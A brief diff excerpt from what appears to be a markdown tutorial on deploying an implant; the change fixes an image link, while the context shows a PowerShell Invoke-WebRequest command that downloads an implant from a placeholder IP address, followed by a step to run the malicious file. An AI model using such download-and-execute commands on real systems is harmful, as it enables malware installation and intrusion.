@@ -32,5 +32,5 @@ Commad: IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]
 
 After downloading the implant we need to run the malicious file 
 
-[Excute](https://i.imgur.com/mkdYQkp.png)
+![Excute](https://i.imgur.com/mkdYQkp.png)
 
